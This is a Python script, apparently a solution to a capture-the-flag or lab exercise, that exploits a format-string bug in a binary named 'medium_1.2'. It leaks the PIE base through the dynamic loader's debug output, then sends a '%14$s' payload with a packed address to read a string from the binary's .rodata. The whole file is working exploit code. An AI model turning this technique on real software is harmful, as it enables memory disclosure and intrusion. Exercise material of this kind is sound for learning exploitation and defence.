import re
import struct
import subprocess
import sys


command = [
    # Динамический загрузчик сообщает PIE-базу для текущего процесса.
    "qemu-amd64",
    "-E",
    "LD_DEBUG=files",
    "-L",
    "/",
    "/lib64/ld-linux-x86-64.so.2",
    "./medium_1.2",
]
process = subprocess.Popen(
    command,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)

# Указатели на PIE-код и .rodata меняются между запусками; адрес строки
# вычисляется относительно базы, полученной именно от этого процесса.
base = None
while True:
    line = process.stderr.readline()
    if not line:
        break
    match = re.search(rb"base:\s*(0x[0-9a-fA-F]+)", line)
    if match:
        base = int(match.group(1), 16)
        break

if base is None:
    process.wait()
    raise SystemExit("Could not determine medium_1.2 PIE base")

# vulnerable передаёт ввод напрямую в printf как формат. %14$s просит printf
# трактовать четырнадцатый позиционный аргумент как char* и вывести строку.
# Пробелы и 7 байтов-заполнителей выставляют указатель в нужный слот стека.
# Нулевой байт завершает формат до самих байтов адреса, чтобы они не стали
# частью строки формата. Строка находится по адресу base+0x2011 в .rodata.
payload = (
    b"%14$s"
    + b" " * 19
    + b"\x00"
    + b"B" * 7
    + struct.pack("<Q", base + 0x2011)
    + b"\n"
)
process.stdin.write(payload)
# Завершаем ввод и забираем результат форматирования из stdout.
process.stdin.close()

output = process.stdout.read()
diagnostics = process.stderr.read()
return_code = process.wait()
sys.stdout.buffer.write(output)
if return_code != 0:
    sys.stderr.buffer.write(diagnostics)
